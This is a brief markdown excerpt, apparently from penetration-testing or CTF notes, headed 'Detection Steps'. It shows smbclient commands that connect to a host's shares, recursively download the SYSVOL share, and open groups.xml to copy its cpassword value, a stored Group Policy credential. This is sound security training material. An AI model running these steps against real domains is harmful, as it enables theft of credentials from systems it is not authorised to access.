- - -
## Detection Steps :

```sh
smbclient \\\\10.10.10.10\\
```

Note the **SYSVOL** share 

```sh
smb> prompt off
smb> recurse on
smb> mget *

cd path/to/groups.xml
cat groups.xml
```

copy the **cpassword** value.

- - -
